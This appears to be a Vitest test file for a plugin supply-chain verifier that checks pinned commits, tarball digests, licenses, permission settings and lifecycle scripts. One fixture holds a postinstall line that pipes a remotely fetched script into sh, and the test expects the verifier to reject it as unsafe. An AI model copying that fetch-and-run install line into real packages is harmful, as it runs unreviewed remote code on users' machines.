import { spawnSync } from 'node:child_process'
import { createHash } from 'node:crypto'
import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, unlinkSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join, resolve } from 'node:path'
import { performance } from 'node:perf_hooks'
import { fileURLToPath, pathToFileURL } from 'node:url'
import { afterEach, describe, expect, it, vi } from 'vitest'
import { boot, composeEntries, loadProfile } from '@deepseek-ai/dsh-app-boot'
import {
  createInstalledArtifactResolver,
  createSmokeProfileChildRunner,
  runCompareBenchmark,
  runPreflight,
  runSmokeProfile,
  runVerifyLock,
  type BenchmarkComparison,
  type CommandResult,
  type SmokeProfileReport,
  type SmokeProfileRunner,
  type SmokeProfileRunnerRequest,
} from '../src/index.ts'
import * as curatedScriptsInvariant from '../src/invariant.ts'
import {
  curatedBenchBaselinesDir,
  curatedBenchManifestsDir,
  curatedBenchTasksDir,
} from '../../curated-bench/src/index.ts'
import * as curatedBenchInvariant from '../../curated-bench/src/invariant.ts'
import { bootCuratedBehaviorProfile, type CuratedFixtureContentBlock } from '../../curated-profiles/tests/fixtures/behavior-profile.ts'
import type { CuratedCandidate } from '@deepseek-ai/dsh-curated-policy'

const packageRoot = fileURLToPath(new URL('..', import.meta.url))
const fixtureCommitA = '0123456789abcdef0123456789abcdef01234567'
const fixtureCommitB = '89abcdef012345670123456789abcdef01234567'
const fixtureCommitC = 'abcdef012345670123456789abcdef0123456789'
const fixtureShaA = '0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef'
const fixtureShaB = '89abcdef012345670123456789abcdef0123456789abcdef0123456701234567'
const fixtureShaC = 'abcdef012345670123456789abcdef0123456789abcdef012345670123456789'
const benchmarkEnvironment = {
  model: 'deepseek-chat',
  prompt: 'prompt-v1',
  workspace: 'fixture-workspace',
  network: 'online',
  seed: 7,
} as const
const previousLockSnapshot = {
  schemaVersion: 1,
  kind: 'curated-lock-snapshot',
  profile: 'web-curated',
  candidates: [{
    id: 'plugin-a',
    repository: 'https://github.com/example/plugin-a',
    commit: fixtureCommitB,
    expectedPackage: 'plugin-a',
    bundlePatch: './cordis.patch.yml',
    tarballSha256: fixtureShaA,
  }],
} as const
const previousProfileSnapshot = {
  schemaVersion: 1,
  kind: 'curated-profile-snapshot',
  profile: 'web-curated',
  bundles: ['@deepseek-ai/dsh-base', '@deepseek-ai/dsh-web-app'],
} as const

interface MutableBenchmarkFixture {
  evidenceKind: string
  pendingCampaigns?: unknown
  requiredCriticalTaskIds: unknown
  previousSnapshots: {
    lock: { sha256: string; snapshot: Record<string, unknown> }
    profile: { sha256: string; snapshot: Record<string, unknown> }
  }
  baseline: {
    execution: { startedAt: string; environment: Record<string, unknown> }
    runs: Array<Record<string, unknown>>
  }
  candidate: {
    execution: { startedAt: string; environment: Record<string, unknown> }
    runs: Array<Record<string, unknown>>
  }
}

afterEach(() => {
  vi.doUnmock('node:fs')
  vi.doUnmock('@deepseek-ai/dsh-curated-policy')
  vi.resetModules()
})

function tempFile(name: string, content: string): string {
  const dir = mkdtempSync(join(tmpdir(), 'dsh-curated-scripts-'))
  const path = join(dir, name)
  writeFileSync(path, content)
  return path
}

function cleanup(path: string): void {
  rmSync(resolve(path, '..'), { recursive: true, force: true })
}

function stageCandidateArtifact(packageName: string, manifestOverrides: Record<string, unknown> = {}): string {
  const root = mkdtempSync(join(tmpdir(), 'dsh-curated-artifact-'))
  stageCandidatePackage(root, packageName, undefined, manifestOverrides)
  return root
}

function stageCandidatePackage(
  root: string,
  packageName: string,
  patch = `- insert:
    - id: dsh-toolkit
      name: ./plugin.mjs
`,
  manifestOverrides: Record<string, unknown> = {},
  pluginSource = [
    'globalThis.__dshCuratedArtifactLoads = (globalThis.__dshCuratedArtifactLoads ?? 0) + 1',
    'export const name = "fixture-candidate"',
    'export const inject = []',
    'export function apply() {}',
    '',
  ].join('\n'),
): string {
  const packageDir = join(root, 'node_modules', packageName)
  mkdirSync(packageDir, { recursive: true })
  writeFileSync(join(packageDir, 'package.json'), JSON.stringify({
    name: packageName,
    version: '1.0.0',
    type: 'module',
    main: './plugin.mjs',
    exports: {
      '.': './plugin.mjs',
      './package.json': './package.json',
    },
    engines: { node: '^22.19.0 || >=24.0.0' },
    license: 'MIT',
    scripts: {},
    dsh: { bundle: { patch: './cordis.patch.yml' } },
    ...manifestOverrides,
  }))
  writeFileSync(join(packageDir, 'plugin.mjs'), pluginSource)
  writeFileSync(join(packageDir, 'cordis.patch.yml'), patch)
  writeFileSync(join(packageDir, '.dsh-curated-artifact.json'), JSON.stringify({
    repository: 'https://github.com/example/plugin-a',
    commit: fixtureCommitB,
    tarballSha256: fixtureShaA,
    changedPaths: ['package.json', 'cordis.patch.yml', 'plugin.mjs'],
  }))
  return packageDir
}

function artifactCatalog(candidateOverrides: Record<string, unknown> = {}): string {
  return JSON.stringify({
    schemaVersion: 1,
    source: {
      awesome: {
        repository: 'https://github.com/example/awesome',
        commit: fixtureCommitA,
        file: 'README.md',
      },
      matrix: 'docs/plugin/superpowers/02-插件矩阵与择优.md',
    },
    candidates: [{
      id: 'plugin-a',
      priority: 'P0',
      capability: 'web-search',
      score: 88,
      scoreDimensions: {
        nativeCompatibility: 18,
        functionalCompleteness: 14,
        testAndCi: 14,
        securityAndPrivacy: 14,
        maintenanceHealth: 8,
        performanceCost: 8,
        operability: 8,
        communitySignal: 4,
      },
      repository: 'https://github.com/example/plugin-a',
      repositoryPath: null,
      commit: fixtureCommitB,
      sourceStatus: 'verified',
      auditedAt: '2026-08-25',
      manifestPath: 'package.json',
      expectedPackage: 'plugin-a',
      nodeEngine: '^22.19.0 || >=24.0.0',
      nodeEngineEvidence: 'package.json#engines.node',
      requiresCorePatch: false,
      license: 'MIT',
      bundlePatch: './cordis.patch.yml',
      tarballSha256: fixtureShaA,
      testFiles: 1,
      ciWorkflows: 1,
      installScripts: {},
      externalDependencies: [],
      networkAccess: [],
      credentials: [],
      targetProfiles: ['web-curated'],
      active: true,
      auditWarnings: [],
      rejections: [],
      ...candidateOverrides,
    }],
  })
}

function artifactCandidate(candidateOverrides: Record<string, unknown> = {}): CuratedCandidate {
  const parsed = JSON.parse(artifactCatalog(candidateOverrides)) as { candidates: CuratedCandidate[] }
  return parsed.candidates[0] as CuratedCandidate
}

function catalog(
  candidatePatch: string,
  options: {
    readonly sourceCommit?: string
    readonly candidateCommit?: string
    readonly tarballSha256?: string
  } = {},
): string {
  return `schemaVersion: 1
source:
  awesome:
    repository: https://github.com/example/awesome
    commit: "${options.sourceCommit ?? fixtureCommitA}"
    file: README.md
  matrix: docs/plugin/superpowers/02-插件矩阵与择优.md
candidates:
  - id: plugin-a
    priority: P0
    capability: web-search
    score: 88
    scoreDimensions: &fixtureScoreDimensions
      nativeCompatibility: 18
      functionalCompleteness: 14
      testAndCi: 14
      securityAndPrivacy: 14
      maintenanceHealth: 8
      performanceCost: 8
      operability: 8
      communitySignal: 4
    repository: https://github.com/example/plugin-a
    repositoryPath: null
    commit: "${options.candidateCommit ?? fixtureCommitB}"
    sourceStatus: verified
    auditedAt: "2026-08-25"
    manifestPath: package.json
    expectedPackage: plugin-a
    nodeEngine: ">=22"
    nodeEngineEvidence: package.json#engines.node
    requiresCorePatch: false
    license: MIT
    bundlePatch: ./cordis.patch.yml
    tarballSha256: "${options.tarballSha256 ?? fixtureShaA}"
    testFiles: 1
    ciWorkflows: 1
    installScripts: {}
    externalDependencies: []
    networkAccess: []
    credentials: []
    targetProfiles: [web-curated]
    active: true
    auditWarnings: []
    rejections: []
${candidatePatch}`
}

function runNode(script: string, args: readonly string[]): CommandResult {
  const result = spawnSync(process.execPath, [resolve(packageRoot, script), ...args], {
    encoding: 'utf8',
    timeout: 15000,
  })
  return {
    status: result.status ?? 125,
    stdout: result.stdout,
    stderr: result.stderr,
  }
}

function benchmarkFixture(additionalCandidateRuns: readonly Record<string, unknown>[] = []): string {
  const additionalBaselineRuns = additionalCandidateRuns.flatMap(run => repeatedBenchmarkRuns({
    taskId: run.taskId,
  }))
  const repeatedAdditionalCandidateRuns = additionalCandidateRuns.flatMap(run => repeatedBenchmarkRuns(run))
  return JSON.stringify({
    evidenceKind: 'observed',
    requiredCriticalTaskIds: ['a', 'b', 'c'],
    previousSnapshots: {
      lock: snapshotEnvelope(previousLockSnapshot),
      profile: snapshotEnvelope(previousProfileSnapshot),
    },
    baseline: {
      profile: 'web',
      execution: {
        id: 'baseline-execution',
        startedAt: '2026-08-25T00:00:00.000Z',
        environment: benchmarkEnvironment,
      },
      lockSnapshot: 'baselines/locks/web.json',
      profileSnapshot: 'baselines/profiles/web.json',
      runs: [
        ...repeatedBenchmarkRuns({ taskId: 'a', success: true, firstTokenMs: 100, promptTokens: 50, schemaTokens: 50, costUsd: 1 }),
        ...repeatedBenchmarkRuns({ taskId: 'b', success: true, firstTokenMs: 200, promptTokens: 50, schemaTokens: 50, costUsd: 1 }),
        ...repeatedBenchmarkRuns({ taskId: 'c', success: false, firstTokenMs: 300, promptTokens: 50, schemaTokens: 50, costUsd: 1, failure: 'timeout' }),
        ...additionalBaselineRuns,
      ],
    },
    candidate: {
      profile: 'web-curated',
      execution: {
        id: 'candidate-execution',
        startedAt: '2026-08-25T00:05:00.000Z',
        environment: benchmarkEnvironment,
      },
      lockSnapshot: 'baselines/locks/web-curated.json',
      profileSnapshot: 'baselines/profiles/web-curated.json',
      runs: [
        ...repeatedBenchmarkRuns({ taskId: 'a', success: true, firstTokenMs: 10, promptTokens: 40, schemaTokens: 40, costUsd: 0.4 }),
        ...repeatedBenchmarkRuns({ taskId: 'b', success: true, firstTokenMs: 20, promptTokens: 50, schemaTokens: 50, costUsd: 0.5 }),
        ...repeatedBenchmarkRuns({ taskId: 'c', success: false, firstTokenMs: 30, promptTokens: 60, schemaTokens: 60, costUsd: 0.6, failure: 'timeout' }),
        ...repeatedAdditionalCandidateRuns,
      ],
    },
  })
}

function repeatedBenchmarkRuns(overrides: Record<string, unknown>): Record<string, unknown>[] {
  return Array.from({ length: 5 }, (_, index) => benchmarkRun({ ...overrides, attempt: index + 1 }))
}

function benchmarkRun(overrides: Record<string, unknown>): Record<string, unknown> {
  return {
    taskId: 'task',
    attempt: 1,
    critical: true,
    startupSucceeded: true,
    dataLossEvents: 0,
    rollbackSupported: true,
    success: true,
    failure: null,
    quality: 80,
    securityCorrectness: 96,
    reliability: 90,
    performanceCost: 70,
    operationExperience: 60,
    upgradeCompatibility: 100,
    firstTokenMs: 100,
    promptTokens: 50,
    schemaTokens: 50,
    costUsd: 1,
    ...overrides,
  }
}

function snapshotEnvelope(snapshot: Record<string, unknown>): { readonly sha256: string; readonly snapshot: Record<string, unknown> } {
  return {
    sha256: createHash('sha256').update(canonicalJson(snapshot)).digest('hex'),
    snapshot,
  }
}

function canonicalJson(value: unknown): string {
  if (value === null || typeof value === 'string' || typeof value === 'boolean' || typeof value === 'number') {
    return JSON.stringify(value)
  }
  if (Array.isArray(value)) return `[${value.map(item => canonicalJson(item)).join(',')}]`
  const record = value as Record<string, unknown>
  return `{${Object.keys(record)
    .sort()
    .map(key => `${JSON.stringify(key)}:${canonicalJson(record[key])}`)
    .join(',')}}`
}

describe('verify-lock command', () => {
  it('uses an explicit artifact root for observed CLI verification', () => {
    const catalogPath = tempFile('catalog.json', artifactCatalog())
    const artifactRoot = stageCandidateArtifact('plugin-a')
    try {
      const result = runVerifyLock([
        '--fixture',
        catalogPath,
        '--artifact-root',
        artifactRoot,
        '--json',
      ])

      expect(result.status).toBe(0)
      expect(JSON.parse(result.stdout)).toMatchObject({
        command: 'verify-lock',
        ok: true,
        observed: true,
      })
    } finally {
      cleanup(catalogPath)
      rmSync(artifactRoot, { recursive: true, force: true })
    }
  })

  it('labels metadata-only verification as non-observed', () => {
    const result = runVerifyLock(['--json'])

    expect(result.status).toBe(0)
    expect(JSON.parse(result.stdout)).toMatchObject({
      command: 'verify-lock',
      ok: true,
      observed: false,
    })
  })

  it('verifies an exact local artifact without loading code or running scripts', async () => {
    const catalogPath = tempFile('catalog.json', artifactCatalog())
    const artifactRoot = stageCandidateArtifact('plugin-a', {
      scripts: { prepare: 'node ./prepare.mjs' },
    })
    const marker = join(artifactRoot, 'prepare-ran')
    writeFileSync(join(artifactRoot, 'node_modules', 'plugin-a', 'prepare.mjs'), [
      'import { writeFileSync } from \'node:fs\'',
      `writeFileSync(${JSON.stringify(marker)}, 'ran')`,
      '',
    ].join('\n'))
    const globalState = globalThis as typeof globalThis & { __dshCuratedArtifactLoads?: number }
    try {
      delete globalState.__dshCuratedArtifactLoads
      const result = runVerifyLock(['--fixture', catalogPath, '--json'], {
        artifactRoots: [artifactRoot],
        artifactResolver: createInstalledArtifactResolver([artifactRoot]),
      })

      expect(result.status).toBe(1)
      const payload = JSON.parse(result.stdout) as { issues: Array<{ code: string; target?: string }> }
      expect(payload.issues).toContainEqual(expect.objectContaining({
        code: 'artifact-install-scripts-mismatch',
        target: 'plugin-a',
      }))
      expect(globalState.__dshCuratedArtifactLoads).toBeUndefined()
      expect(() => readFileSync(marker)).toThrow()
    } finally {
      delete globalState.__dshCuratedArtifactLoads
      cleanup(catalogPath)
      rmSync(artifactRoot, { recursive: true, force: true })
    }
  })

  it.each([
    {
      patch: `- insert:
    - id: permission-rules
      name: dsh-permission-rules
      config:
        badFilePolicy: ignore-with-warning
        enforce: true
`,
      code: 'artifact-permission-bad-file-policy',
    },
    {
      patch: `- insert:
    - id: permission-rules
      name: dsh-permission-rules
      config:
        badFilePolicy: fail
        enforce: false
`,
      code: 'artifact-permission-enforcement-disabled',
    },
  ])('rejects permission plugin artifact config that does not fail closed', async ({ patch, code }) => {
    const catalogPath = tempFile('catalog.json', artifactCatalog({
      id: 'dsh-permission-rules',
      capability: 'permission-policy',
      expectedPackage: 'dsh-permission-rules',
      resources: { waterfallListeners: ['tools/pre-execute:next'] },
    }))
    const artifactRoot = mkdtempSync(join(tmpdir(), 'dsh-curated-permission-artifact-'))
    stageCandidatePackage(artifactRoot, 'dsh-permission-rules', patch)
    try {
      const result = runVerifyLock(['--fixture', catalogPath, '--json'], {
        artifactRoots: [artifactRoot],
        artifactResolver: createInstalledArtifactResolver([artifactRoot]),
      })

      expect(result.status).toBe(1)
      expect(JSON.parse(result.stdout)).toMatchObject({
        issues: [{ code, target: 'dsh-permission-rules' }],
      })
    } finally {
      cleanup(catalogPath)
      rmSync(artifactRoot, { recursive: true, force: true })
    }
  })

  it('accepts fail-closed configuration from the real permission plugin artifact format', () => {
    const catalogPath = tempFile('catalog.json', artifactCatalog({
      id: 'dsh-permission-rules',
      capability: 'permission-policy',
      expectedPackage: 'dsh-permission-rules',
      resources: { waterfallListeners: ['tools/pre-execute:next'] },
    }))
    const artifactRoot = mkdtempSync(join(tmpdir(), 'dsh-curated-permission-artifact-'))
    stageCandidatePackage(artifactRoot, 'dsh-permission-rules', `- insert:
    - id: permission-rules
      name: dsh-permission-rules
      config:
        badFilePolicy: fail
        enforce: true
`)
    try {
      const result = runVerifyLock(['--fixture', catalogPath, '--json'], {
        artifactRoots: [artifactRoot],
        artifactResolver: createInstalledArtifactResolver([artifactRoot]),
      })

      expect(result.status).toBe(0)
    } finally {
      cleanup(catalogPath)
      rmSync(artifactRoot, { recursive: true, force: true })
    }
  })

  it.each([
    {
      name: 'an unreachable package',
      expectedCode: 'artifact-unreachable',
      setup: () => mkdtempSync(join(tmpdir(), 'dsh-curated-artifact-missing-')),
    },
    {
      name: 'a different commit',
      expectedCode: 'artifact-commit-mismatch',
      setup: () => {
        const root = stageCandidateArtifact('plugin-a')
        writeFileSync(join(root, 'node_modules', 'plugin-a', '.dsh-curated-artifact.json'), JSON.stringify({
          repository: 'https://github.com/example/plugin-a',
          commit: fixtureCommitC,
          tarballSha256: fixtureShaA,
          changedPaths: [],
        }))
        return root
      },
    },
    {
      name: 'a different tarball digest',
      expectedCode: 'artifact-tarball-sha-mismatch',
      setup: () => {
        const root = stageCandidateArtifact('plugin-a')
        writeFileSync(join(root, 'node_modules', 'plugin-a', '.dsh-curated-artifact.json'), JSON.stringify({
          repository: 'https://github.com/example/plugin-a',
          commit: fixtureCommitB,
          tarballSha256: fixtureShaB,
          changedPaths: [],
        }))
        return root
      },
    },
    {
      name: 'a different package name',
      expectedCode: 'artifact-package-name-mismatch',
      setup: () => stageCandidateArtifact('plugin-a', { name: 'other-package' }),
    },
    {
      name: 'a different license',
      expectedCode: 'artifact-license-mismatch',
      setup: () => stageCandidateArtifact('plugin-a', { license: 'Apache-2.0' }),
    },
    {
      name: 'a different dependency set',
      expectedCode: 'artifact-dependencies-mismatch',
      setup: () => stageCandidateArtifact('plugin-a', { dependencies: { zod: '^4.0.0' } }),
    },
    {
      name: 'a missing bundle patch',
      expectedCode: 'artifact-bundle-patch-missing',
      setup: () => {
        const root = stageCandidateArtifact('plugin-a')
        unlinkSync(join(root, 'node_modules', 'plugin-a', 'cordis.patch.yml'))
        return root
      },
    },
    {
      name: 'an incompatible Node range',
      expectedCode: 'artifact-node-incompatible',
      setup: () => stageCandidateArtifact('plugin-a', { engines: { node: '>=99' } }),
    },
    {
      name: 'a core modification',
      expectedCode: 'artifact-core-modification',
      setup: () => {
        const root = stageCandidateArtifact('plugin-a')
        writeFileSync(join(root, 'node_modules', 'plugin-a', '.dsh-curated-artifact.json'), JSON.stringify({
          repository: 'https://github.com/example/plugin-a',
          commit: fixtureCommitB,
          tarballSha256: fixtureShaA,
          changedPaths: ['packages/core/agent-loop/src/index.ts'],
        }))
        return root
      },
    },
  ])('rejects $name from the artifact resolver', async ({ expectedCode, setup }) => {
    const catalogPath = tempFile('catalog.json', artifactCatalog())
    const artifactRoot = setup()
    try {
      const result = runVerifyLock(['--fixture', catalogPath, '--json'], {
        artifactRoots: [artifactRoot],
        artifactResolver: createInstalledArtifactResolver([artifactRoot]),
      })
      const payload = JSON.parse(result.stdout) as { issues: Array<{ code: string; target?: string }> }

      expect(result.status).toBe(1)
      expect(payload.issues).toContainEqual(expect.objectContaining({
        code: expectedCode,
        target: 'plugin-a',
      }))
    } finally {
      cleanup(catalogPath)
      rmSync(artifactRoot, { recursive: true, force: true })
    }
  })

  it('accepts the checked-in allowlist with deterministic text output', () => {
    const result = runVerifyLock([])

    expect(result.status).toBe(0)
    expect(result.stderr).toBe('')
    expect(result.stdout).toMatch(/^verify-lock: ok \(\d+ candidates\)\n$/u)
  })

  it('emits deterministic JSON for a valid fixture', () => {
    const path = tempFile('catalog.yaml', catalog(''))
    try {
      const result = runVerifyLock(['--fixture', path, '--json'])

      expect(result.status).toBe(0)
      expect(JSON.parse(result.stdout)).toEqual({
        command: 'verify-lock',
        ok: true,
        observed: false,
        candidateCount: 1,
        issues: [],
      })
    } finally {
      cleanup(path)
    }
  })

  it('rejects floating sources, missing audit fields, and missing tarball SHA without leaking secrets', () => {
    const path = tempFile('catalog.yaml', catalog(`    resources:
      envVars: [PLUGIN_A_TOKEN]
    config:
      entryId: plugin-a
      values:
        apiKey: sk-test-secret-value
  - id: plugin-b
    priority: P1
    capability: memory
    score: 88
    scoreDimensions: *fixtureScoreDimensions
    repository: https://github.com/example/plugin-b
    repositoryPath: null
    commit: latest
    sourceStatus: verified
    auditedAt: "2026-08-25"
    manifestPath: null
    expectedPackage: null
    nodeEngine: null
    nodeEngineEvidence: null
    requiresCorePatch: false
    license: null
    bundlePatch: null
    tarball:
      url: https://registry.npmjs.org/plugin-b/-/plugin-b-1.0.0.tgz
    testFiles: 0
    ciWorkflows: 0
    installScripts: {}
    externalDependencies: []
    networkAccess: []
    credentials: []
    targetProfiles: [web-curated]
    active: true
    auditWarnings: []
    rejections: []
`))
    try {
      const result = runVerifyLock(['--fixture', path])

      expect(result.status).toBe(1)
      expect(result.stdout).toContain('candidate-commit-unpinned plugin-b')
      expect(result.stdout).toContain('candidate-license-missing plugin-b')
      expect(result.stdout).toContain('candidate-package-missing plugin-b')
      expect(result.stdout).toContain('candidate-bundle-patch-missing plugin-b')
      expect(result.stdout).toContain('candidate-tarball-sha-missing plugin-b')
      expect(result.stdout).not.toContain('sk-test-secret-value')
      expect(result.stdout).not.toContain('PLUGIN_A_TOKEN')
    } finally {
      cleanup(path)
    }
  })

  it('runs through the source-tree wrapper without a prior build', () => {
    const result = runNode('verify-lock.mjs', ['--json'])

    expect(result.status).toBe(0)
    expect(JSON.parse(result.stdout)).toMatchObject({
      command: 'verify-lock',
      ok: true,
    })
  })

  it('reports input failures as JSON without leaking fixture secrets', () => {
    const result = runVerifyLock(['--fixture=/definitely/missing/sk-verify-secret/catalog.yaml', '--json'])

    expect(result.status).toBe(1)
    expect(JSON.parse(result.stdout)).toMatchObject({
      command: 'verify-lock',
      ok: false,
      issues: [{ code: 'verify-lock-input-invalid' }],
    })
    expect(result.stdout).toContain('[REDACTED]')
    expect(result.stdout).not.toContain('sk-verify-secret')
  })

  it('accepts tarball SHA declarations at the top level and inside tarball metadata', () => {
    const path = tempFile('catalog.yaml', catalog(`    tarball:
      url: https://registry.npmjs.org/plugin-a/-/plugin-a-1.0.0.tgz
  - id: plugin-b
    priority: P1
    capability: memory
    score: 88
    scoreDimensions: *fixtureScoreDimensions
    repository: https://github.com/example/plugin-b
    repositoryPath: null
    commit: "${fixtureCommitC}"
    sourceStatus: verified
    auditedAt: "2026-08-25"
    manifestPath: package.json
    expectedPackage: plugin-b
    nodeEngine: ">=22"
    nodeEngineEvidence: package.json#engines.node
    requiresCorePatch: false
    license: MIT
    bundlePatch: ./cordis.patch.yml
    tarball:
      url: https://registry.npmjs.org/plugin-b/-/plugin-b-1.0.0.tgz
      sha256: "${fixtureShaB}"
    testFiles: 1
    ciWorkflows: 1
    installScripts: {}
    externalDependencies: []
    networkAccess: []
    credentials: []
    targetProfiles: [web-research]
    active: true
    auditWarnings: []
    rejections: []
`))
    try {
      const result = runVerifyLock(['--fixture', path, '--json'])

      expect(result.status).toBe(0)
      expect(JSON.parse(result.stdout)).toMatchObject({
        command: 'verify-lock',
        ok: true,
        candidateCount: 2,
        issues: [],
      })
    } finally {
      cleanup(path)
    }
  })

  it('rejects active candidates with invalid tarball SHA declarations', () => {
    const path = tempFile('catalog.yaml', catalog(`  - id: plugin-b
    priority: P1
    capability: memory
    score: 88
    scoreDimensions: *fixtureScoreDimensions
    repository: https://github.com/example/plugin-b
    repositoryPath: null
    commit: "${fixtureCommitC}"
    sourceStatus: verified
    auditedAt: "2026-08-25"
    manifestPath: package.json
    expectedPackage: plugin-b
    nodeEngine: ">=22"
    nodeEngineEvidence: package.json#engines.node
    requiresCorePatch: false
    license: MIT
    bundlePatch: ./cordis.patch.yml
    tarballSha256: not-a-sha
    testFiles: 1
    ciWorkflows: 1
    installScripts: {}
    externalDependencies: []
    networkAccess: []
    credentials: []
    targetProfiles: [web-research]
    active: true
    auditWarnings: []
    rejections: []
`))
    try {
      const result = runVerifyLock(['--fixture', path, '--json'])

      expect(result.status).toBe(1)
      expect(JSON.parse(result.stdout)).toMatchObject({
        command: 'verify-lock',
        ok: false,
        issues: [{ code: 'candidate-tarball-sha-invalid', target: 'plugin-b' }],
      })
    } finally {
      cleanup(path)
    }
  })

  it('rejects active third-party candidates with no tarball SHA metadata', () => {
    const path = tempFile('catalog.yaml', catalog(`  - id: plugin-b
    priority: P1
    capability: memory
    score: 88
    scoreDimensions: *fixtureScoreDimensions
    repository: https://github.com/example/plugin-b
    repositoryPath: null
    commit: "${fixtureCommitC}"
    sourceStatus: verified
    auditedAt: "2026-08-25"
    manifestPath: package.json
    expectedPackage: plugin-b
    nodeEngine: ">=22"
    nodeEngineEvidence: package.json#engines.node
    requiresCorePatch: false
    license: MIT
    bundlePatch: ./cordis.patch.yml
    testFiles: 1
    ciWorkflows: 1
    installScripts: {}
    externalDependencies: []
    networkAccess: []
    credentials: []
    targetProfiles: [web-research]
    active: true
    auditWarnings: []
    rejections: []
`))
    try {
      const result = runVerifyLock(['--fixture', path, '--json'])

      expect(result.status).toBe(1)
      expect(JSON.parse(result.stdout)).toMatchObject({
        command: 'verify-lock',
        ok: false,
        issues: [{ code: 'candidate-tarball-sha-missing', target: 'plugin-b' }],
      })
    } finally {
      cleanup(path)
    }
  })

  it('rejects placeholder commit and tarball SHA declarations', () => {
    const path = tempFile('catalog.yaml', catalog('', {
      sourceCommit: 'a1'.repeat(20),
      candidateCommit: 'd1'.repeat(20),
      tarballSha256: 'e'.repeat(64),
    }))
    try {
      const result = runVerifyLock(['--fixture', path, '--json'])
      const payload = JSON.parse(result.stdout) as { issues: Array<{ code: string; target?: string; message: string }> }

      expect(result.status).toBe(1)
      expect(payload.issues).toEqual([
        {
          code: 'candidate-commit-placeholder',
          target: 'plugin-a',
          message: 'candidate commit must not be a placeholder digest',
        },
        {
          code: 'candidate-tarball-sha-placeholder',
          target: 'plugin-a',
          message: 'candidate tarball SHA-256 digest must not be a placeholder digest',
        },
        {
          code: 'source-commit-placeholder',
          message: 'curated catalog source commit must not be a placeholder digest',
        },
      ])
    } finally {
      cleanup(path)
    }
  })

  it('reports omitted admission scores as lock issues', () => {
    const parsed = JSON.parse(artifactCatalog()) as { candidates: Record<string, unknown>[] }
    delete parsed.candidates[0]?.score
    const path = tempFile('catalog.json', JSON.stringify(parsed))
    try {
      const result = runVerifyLock(['--fixture', path, '--json'])

      expect(result.status).toBe(1)
      expect(JSON.parse(result.stdout)).toMatchObject({
        issues: [{
          code: 'candidate-score-missing',
          target: 'plugin-a',
          message: 'active candidate must declare a static admission score',
        }],
      })
    } finally {
      cleanup(path)
    }
  })

  it('rejects active candidates with scores below the scenario admission tier', () => {
    const path = tempFile('catalog.yaml', catalog(`  - id: plugin-c
    priority: P1
    capability: browser-computer-use
    score: 64
    scoreDimensions:
      nativeCompatibility: 14
      functionalCompleteness: 10
      testAndCi: 10
      securityAndPrivacy: 10
      maintenanceHealth: 6
      performanceCost: 6
      operability: 5
      communitySignal: 3
    repository: https://github.com/example/plugin-c
    repositoryPath: null
    commit: "76543210fedcba9876543210fedcba9876543210"
    sourceStatus: verified
    auditedAt: "2026-08-25"
    manifestPath: package.json
    expectedPackage: plugin-c
    nodeEngine: ">=22"
    nodeEngineEvidence: package.json#engines.node
    requiresCorePatch: false
    license: MIT
    bundlePatch: ./cordis.patch.yml
    tarballSha256: "${fixtureShaC}"
    testFiles: 1
    ciWorkflows: 1
    installScripts: {}
    externalDependencies: []
    networkAccess: []
    credentials: []
    targetProfiles: [web-coding]
    active: true
    auditWarnings: []
    rejections: []
`))
    try {
      const result = runVerifyLock(['--fixture', path, '--json'])
      const payload = JSON.parse(result.stdout) as { issues: Array<{ code: string; target?: string }> }

      expect(result.status).toBe(1)
      expect(payload.issues).toEqual([
        { code: 'candidate-score-too-low', target: 'plugin-c', message: 'active candidate score must reach the scenario admission tier' },
      ])
    } finally {
      cleanup(path)
    }
  })

  it('preserves profile conflict details in JSON output', () => {
    const path = tempFile('catalog.yaml', catalog(`  - id: plugin-b
    priority: P1
    capability: web-search
    score: 88
    scoreDimensions: *fixtureScoreDimensions
    repository: https://github.com/example/plugin-b
    repositoryPath: null
    commit: "${fixtureCommitC}"
    sourceStatus: verified
    auditedAt: "2026-08-25"
    manifestPath: package.json
    expectedPackage: plugin-b
    nodeEngine: ">=22"
    nodeEngineEvidence: package.json#engines.node
    requiresCorePatch: false
    license: MIT
    bundlePatch: ./cordis.patch.yml
    tarballSha256: "${fixtureShaB}"
    testFiles: 1
    ciWorkflows: 1
    installScripts: {}
    externalDependencies: []
    networkAccess: []
    credentials: []
    targetProfiles: [web-curated]
    active: true
    auditWarnings: []
    rejections: []
`))
    try {
      const result = runVerifyLock(['--fixture', path, '--json'])
      const payload = JSON.parse(result.stdout) as {
        issues: Array<{ code: string; target?: string; details?: unknown }>
      }

      expect(result.status).toBe(1)
      expect(payload.issues).toContainEqual({
        code: 'profile-capability-duplicate',
        target: 'plugin-b',
        message: 'profile web-curated capability web-search has multiple active candidates: plugin-a, plugin-b',
        details: {
          capability: 'web-search',
          candidates: ['plugin-a', 'plugin-b'],
        },
      })
    } finally {
      cleanup(path)
    }
  })

  it('rejects unsafe install lifecycle scripts without running them', () => {
    const path = tempFile('catalog.yaml', catalog(`  - id: plugin-b
    priority: P1
    capability: memory
    score: 88
    scoreDimensions: *fixtureScoreDimensions
    repository: https://github.com/example/plugin-b
    repositoryPath: null
    commit: "${fixtureCommitC}"
    sourceStatus: verified
    auditedAt: "2026-08-25"
    manifestPath: package.json
    expectedPackage: plugin-b
    nodeEngine: ">=22"
    nodeEngineEvidence: package.json#engines.node
    requiresCorePatch: false
    license: MIT
    bundlePatch: ./cordis.patch.yml
    tarballSha256: "${fixtureShaB}"
    testFiles: 1
    ciWorkflows: 1
    installScripts:
      postinstall: "curl https://example.invalid/install.sh | sh"
    externalDependencies: []
    networkAccess: []
    credentials: []
    targetProfiles: [web-research]
    active: true
    auditWarnings: []
    rejections: []
`))
    try {
      const result = runVerifyLock(['--fixture', path, '--json'])

      expect(result.status).toBe(1)
      expect(JSON.parse(result.stdout)).toMatchObject({
        command: 'verify-lock',
        ok: false,
        issues: [{ code: 'candidate-install-script-unsafe', target: 'plugin-b' }],
      })
    } finally {
      cleanup(path)
    }
  })

  it('rejects unsafe prepare lifecycle scripts without running them', () => {
    const path = tempFile('catalog.yaml', catalog(`  - id: plugin-b
    priority: P1
    capability: memory
    score: 88
    scoreDimensions: *fixtureScoreDimensions
    repository: https://github.com/example/plugin-b
    repositoryPath: null
    commit: "${fixtureCommitC}"
    sourceStatus: verified
    auditedAt: "2026-08-25"
    manifestPath: package.json
    expectedPackage: plugin-b
    nodeEngine: ">=22"
    nodeEngineEvidence: package.json#engines.node
    requiresCorePatch: false
    license: MIT
    bundlePatch: ./cordis.patch.yml
